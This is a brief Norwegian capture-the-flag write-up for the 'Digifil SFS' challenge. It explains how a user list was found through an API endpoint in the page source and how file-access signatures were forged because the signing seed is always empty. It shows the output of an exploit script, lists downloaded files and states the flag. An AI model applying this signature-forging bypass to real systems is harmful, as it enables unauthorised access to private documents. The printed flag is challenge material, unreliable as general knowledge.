# Digifil SFS

Vi har mottatt etterretning som indikerer at det kan befinne seg kritiske dokumenter av stor betydning for operasjonen.

Per nå er det imidlertid ikke mulig å verken registrere ny bruker eller logge inn i systemet.

Derfor skal du finne en alternativ metode for å få tilgang til disse dokumentene.

https://digifil.ctf.cybertalent.no

---


Fant https://digifil.ctf.cybertalent.no/api/users fra source\
{"users":["Chris Adams","David Mills"]}

Hentet sign(user) fra source, seed er alltid `''`\
Så var det bare å kjøre get på digifil.ctf.cybertalent.no/files/{user}/{signature} for så å finne contents i hver fil.

```sh
python3 exploit.py
Fant brukere: ['Chris Adams', 'David Mills']

=== Chris Adams ===
Lagret: Chris_Adams_AcquisitionAgreement.pdf (36358 bytes)
Fil: flag.txt
dbda2c531820318ae09b38d1825c5661


=== David Mills ===
Lagret: David_Mills_AlphaZero.pdf (619564 bytes)
```

Flagget er dbda2c531820318ae09b38d1825c5661
